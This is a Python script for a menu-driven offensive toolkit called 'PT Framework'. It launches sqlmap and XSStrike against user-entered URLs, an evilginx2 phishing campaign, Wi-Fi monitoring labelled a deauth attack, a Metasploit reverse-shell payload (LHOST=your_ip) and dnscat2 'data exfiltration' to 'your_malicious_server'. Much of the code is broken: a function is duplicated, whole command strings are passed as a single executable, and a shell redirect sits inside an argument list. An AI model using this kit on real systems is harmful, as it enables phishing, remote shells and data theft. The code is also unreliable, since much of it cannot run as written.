import os
import subprocess
import time
import sys
import asyncio
import aiohttp
import json

# File to store API keys
CONFIG_FILE = "config.json"

# Define tool checks
def check_tool(tool_name):
    """Check if the tool is installed on the system."""
    try:
        subprocess.run([tool_name, '--help'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        return True
    except FileNotFoundError:
        return False

# Banner for the framework
def display_splash_screen():
    splash = """
_____________________  ___________                                                  __                  _____  ____.____   __________  ___ ___    _____           _______  ____ 
\______   \__    ___/  \_   _____/____________     _____   ______  _  _____________|  | __             /  |  |/_   |    |  \______   \/   |   \  /  |  |          \   _  \/_   |
 |     ___/ |    |      |    __)  \_  __ \__  \   /     \_/ __ \ \/ \/ /  _ \_  __ \  |/ /   ______   /   |  |_|   |    |   |     ___/    ~    \/   |  |_  ______ /  /_\  \|   |
 |    |     |    |      |     \    |  | \// __ \_|  Y Y  \  ___/\     (  <_> )  | \/    <   /_____/  /    ^   /|   |    |___|    |   \    Y    /    ^   / /_____/ \  \_/   \   |
 |____|     |____|______\___  /    |__|  (____  /|__|_|  /\___  >\/\_/ \____/|__|  |__|_ \           \____   | |___|_______ \____|    \___|_  /\____   |           \_____  /___|
                 /_____/    \/                \/       \/     \/                        \/                |__|             \/               \/      |__|                 \/     
        
                                                      _:_
                                                    '-.-'
                                           ()      __.'.__
                                        .-:--:-.  |_______|
                                 ()      \____/    \=====/
                                 /\      {====}     )___(
                      (\=,      //\\      )__(     /_____\
      __    |'-'-'|  //  .\    (    )    /____\     |   |
     /  \   |_____| (( \_  \    )__(      |  |      |   |
     \__/    |===|   ))  `\_)  /____\     |  |      |   |
    /____\   |   |  (/     \    |  |      |  |      |   |
     |  |    |   |   | _.-'|    |  |      |  |      |   |
     |__|    )___(    )___(    /____\    /____\    /_____\
    (====)  (=====)  (=====)  (======)  (======)  (=======)
    }===={  }====={  }====={  }======{  }======{  }======={
   (______)(_______)(_______)(________)(________)(_________)
          
"""
    print(splash)
    print("PT Framework 41PH4-01\n")

# Read API keys from config file or prompt user for them
def read_api_keys():
    if os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, 'r') as f:
            return json.load(f)
    else:
        return {}

def save_api_keys(api_keys):
    with open(CONFIG_FILE, 'w') as f:
        json.dump(api_keys, f)

# Prompt the user for API keys if not present
def get_api_key(service_name):
    api_keys = read_api_keys()

    if service_name in api_keys:
        return api_keys[service_name]
    
    api_key = input(f"[*] Enter your {service_name} API key: ")
    api_keys[service_name] = api_key
    save_api_keys(api_keys)

    return api_key

# Define tool checks
def check_tool(tool_name):
    """Check if the tool is installed on the system."""
    try:
        subprocess.run([tool_name, '--help'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        return True
    except FileNotFoundError:
        return False

# Tools and their commands
TOOLS = {
    'sqlmap': 'sqlmap --help',
    'xsstrike': 'xsstrike --help',
    'aircrack-ng': 'airmon-ng --help',
    'metasploit': 'msfvenom --help',
    'evilginx2': 'evilginx2 --help',
    'nmap': 'nmap -v',
    'nessus': 'nessus -h',
    'dnscat2': 'dnscat2 --help',
}

# Global settings
TARGET = None
USER_AGENT = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}

# Tool checking function
def check_tools():
    missing_tools = []
    for tool, command in TOOLS.items():
        if not check_tool(tool):
            missing_tools.append(tool)
    if missing_tools:
        print(f"Warning: Missing tools: {', '.join(missing_tools)}")
    else:
        print("All tools are installed and ready!")

# Phishing Campaign with Evilginx2
def phishing_campaign():
    print("[*] Starting Phishing Campaign with Evilginx2...")
    subprocess.run(["evilginx2", "launch"])

# SQL Injection with sqlmap
def sql_injection(url):
    print(f"[*] Running SQL Injection Test on {url}")
    subprocess.run([TOOLS['sqlmap'], f"-u {url} --batch"])

# XSS Testing with XSStrike
def test_xss(url):
    print(f"[*] Running XSS Testing on {url}")
    subprocess.run([TOOLS['xsstrike'], f"-u {url} --batch"])

# Network Scanning with Nmap
def network_scan(target):
    print(f"[*] Running Network Scan on {target}")
    subprocess.run([TOOLS['nmap'], target])

# Wi-Fi Deauth Attack with aircrack-ng
def wifi_attack(interface):
    print(f"[*] Setting {interface} to monitor mode for Wi-Fi attacks...")
    subprocess.run(["airmon-ng", "start", interface])
    subprocess.run(["airodump-ng", interface])

# Metasploit Payload Generation
def metasploit_payload():
    print("[*] Generating Metasploit payload...")
    subprocess.run([TOOLS['metasploit'], "-p linux/x86/shell_reverse_tcp LHOST=your_ip LPORT=4444 -f elf > shell.elf"])

# Subdomain Enumeration using custom script
async def fetch(session, url):
    """Fetch data from a URL."""
    async with session.get(url) as response:
        return await response.text()

async def get_subdomains(domain):
    """Get subdomains from public sources."""
    subdomains = set()

    # Prompt user for API keys
    virustotal_api_key = get_api_key('VirusTotal')
    shodan_api_key = get_api_key('Shodan')

    urls = [
        f"https://crt.sh/?q={domain}&output=json",
        f"https://api.hackertarget.com/hostsearch/?q={domain}",
    ]

    if virustotal_api_key:
        # Add VirusTotal API query (Example)
        urls.append(f"https://www.virustotal.com/api/v3/domains/{domain}")
    
    if shodan_api_key:
        # Add Shodan API query (Example)
        urls.append(f"https://api.shodan.io/shodan/host/{domain}?key={shodan_api_key}")

    async with aiohttp.ClientSession() as session:
        tasks = [fetch(session, url) for url in urls]
        responses = await asyncio.gather(*tasks)

        for response in responses:
            if response.startswith('['):  # JSON response from crt.sh
                json_response = json.loads(response)
                for item in json_response:
                    subdomains.add(item['name_value'])
            else:  # Plain text response from hackertarget
                lines = response.split('\n')
                for line in lines:
                    if line:
                        subdomains.add(line.split(',')[0])

    return list(subdomains)

def subdomain_enum(domain):
    """Wrapper to call the async function."""
    print(f"[*] Enumerating subdomains for {domain}...")
    subdomains = asyncio.run(get_subdomains(domain))
    print(f"Found subdomains: {subdomains}")

# Data Exfiltration with DNS Tunneling (dnscat2)
def dns_tunneling():
    print("[*] Starting DNS Tunneling for Data Exfiltration...")
    subprocess.run([TOOLS['dnscat2'], "--dns", "your_malicious_server"])

# Main driver function for the framework
def main():
    display_splash_screen()
    check_tools()

    while True:
        print("\nSelect an option:")
        print("1. Run SQL Injection Test")
        print("2. Run XSS Test")
        print("3. Start Phishing Campaign")
        print("4. Run Network Scan")
        print("5. Run Wi-Fi Deauth Attack")
        print("6. Generate Metasploit Payload")
        print("7. Subdomain Enumeration")
        print("8. Data Exfiltration via DNS Tunneling")
        print("9. Exit")

        choice = input("Enter choice: ")

        if choice == '1':
            url = input("Enter the target URL: ")
            sql_injection(url)
        elif choice == '2':
            url = input("Enter the target URL: ")
            test_xss(url)
        elif choice == '3':
            phishing_campaign()
        elif choice == '4':
            target = input("Enter target IP/URL: ")
            network_scan(target)
        elif choice == '5':
            interface = input("Enter network interface: ")
            wifi_attack(interface)
        elif choice == '6':
            metasploit_payload()
        elif choice == '7':
            domain = input("Enter domain for subdomain enumeration: ")
            subdomain_enum(domain)
        elif choice == '8':
            dns_tunneling()
        elif choice == '9':
            print("Exiting...")
            break
        else:
            print("Invalid choice, please try again.")

if __name__ == "__main__":
    main()
